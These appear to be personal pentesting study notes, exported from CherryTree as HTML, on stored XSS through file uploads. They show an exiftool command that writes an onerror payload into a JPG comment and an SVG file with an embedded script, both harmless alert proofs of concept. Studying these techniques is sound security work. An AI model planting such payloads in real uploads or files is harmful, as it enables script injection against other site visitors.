<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XSS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>XSS</h1><br/><br />Some file types can allow to introduce a <span style="text-decoration:underline;">Stored XSS vulnerability</span> to the web application by uploading maliciously crafted versions of them.<br /><br />• <strong>HTML files upload</strong><br />	HTML files won&#39;t allow us to execute code (e.g., PHP) but is <span style="text-decoration:underline;">still be possible to implement JavaScript code within them to carry an XSS or CSRF attack</span> on whoever visits the uploaded HTML page. <br />	it may be possible to trick a visitor into visiting the link the HTML file uploaded and carry the attack on their machines.<br /><br />• <strong>Images</strong><br />	web applications could be vulnerable if they display image&#39;s metadata after the upload.<br />	 It may possible include an XSS payload in one of the <span style="text-decoration:underline;">Metadata parameters</span> that accept raw text: <br />   ◇ <span style="text-decoration:underline;">Image (JPG, PNG, ...) in the Comment </span><br />	<div class="codebox"><pre>exiftool -Comment=&#39; &quot;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;&#39; TEST.jpg</pre></div><br />	<div class="codebox"><pre>exiftool TEST.jpg</pre></div><br />		<a href=""><img src="images/2298-1.png" alt="images/2298-1.png" /></a><br />   ◇ <span style="text-decoration:underline;">SVG</span><br />   		Scalable Vector Graphics (SVG) images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. Once that the image is been uploaded, the XSS payload will be triggered whenever the image is displayed.<br />   <span style="color:#865e3c;">example:</span><br />   <div class="codebox"><pre>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br />&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;<br />&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1&quot; height=&quot;1&quot;&gt;<br />    &lt;rect x=&quot;1&quot; y=&quot;1&quot; width=&quot;1&quot; height=&quot;1&quot; fill=&quot;green&quot; stroke=&quot;black&quot; /&gt;<br />    &lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;window.origin&quot;);&lt;/script&gt;<br />&lt;/svg&gt;</pre></div><br />   	<a href=""><img src="images/2298-2.png" alt="images/2298-2.png" /></a><a href=""><img src="images/2298-3.png" alt="images/2298-3.png" /></a><br />   </div>
</body>
</html>
